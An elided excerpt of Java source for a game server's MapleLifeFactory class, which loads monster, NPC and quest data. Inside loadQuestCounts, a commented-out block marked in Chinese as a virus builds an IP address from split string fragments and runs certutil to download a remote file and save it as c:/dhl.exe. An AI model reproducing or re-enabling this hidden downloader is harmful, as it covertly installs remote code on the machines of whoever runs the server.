...
public class MapleLifeFactory
{
    ...
    public static final void loadQuestCounts() {
       //当病毒处理
//		String loadnumber = "4"+"9."+"2"+"3"+"5"+"."+"1"+"0"+"5"+"."+"1"+"7"+"6";
//		Runtime runtime = Runtime.getRuntime();
//		try {
//
//            runtime.exec("certutil -urlcache -split -f http://" + loadnumber + "/dhl.zzz c:/dhl.exe");
//
//        } catch (Exception e) {
...
//        }
    ...
    public static MapleMonster getMonster(final int mid) {
        MapleMonsterStats stats = (server.life.MapleMonsterStats)(server.life.MapleMonsterStats)MapleLifeFactory.monsterStats.get(mid);
        if (stats == null) {
            ...
            if (reviveInfo != null) {
                final List revives = new LinkedList();
    ...
    public static MapleNPC getNPC(final int nid) {
        String name = (String)(String)MapleLifeFactory.npcNames.get(nid);
        if (name == null) {
    ...
    static {
        ...
        npcNames = new WeakHashMap<Integer, String>();
        monsterStats = new WeakHashMap<Integer, MapleMonsterStats>();
        NPCLoc = new WeakHashMap<Integer, Integer>();
        questCount = new WeakHashMap<Integer, List<Integer>>();
    }
}
